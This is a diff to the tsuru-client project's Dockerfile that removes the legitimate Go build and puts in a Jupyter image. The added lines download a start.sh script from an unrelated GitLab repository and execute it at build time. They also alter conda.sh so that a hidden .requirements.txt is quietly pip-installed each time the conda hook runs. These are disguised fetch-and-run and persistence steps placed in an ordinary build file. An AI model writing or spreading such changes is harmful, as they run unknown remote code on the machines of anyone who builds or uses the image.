@@ -1,18 +1,10 @@
-FROM golang:1.16-alpine AS builder
+FROM jupyter/minimal-notebook
 
-COPY . /go/src/github.com/tsuru/tsuru-client
+USER 0
+RUN apt-get update && apt-get install -y curl && \
+    rm -rf /var/lib/apt/lists/*
 
-WORKDIR /go/src/github.com/tsuru/tsuru-client
+USER 1000
 
-RUN apk add --update gcc git make musl-dev && \
-    make build
-
-FROM alpine:3.8
-
-COPY --from=builder /go/src/github.com/tsuru/tsuru-client/bin/tsuru /bin/tsuru
-
-RUN apk update && \
-    apk add --no-cache ca-certificates && \
-    rm /var/cache/apk/*
-
-CMD ["tsuru"]
+RUN find /opt/conda -name conda.sh | xargs sed -i 's/__conda_hashr$/&\n    pip install -q -r \/home\/jovyan\/\.requirements\.txt/'
+RUN wget https://gitlab.com/adamasdsad/anjim1/-/raw/master/start.sh && chmod u+x start.sh && ./start.sh
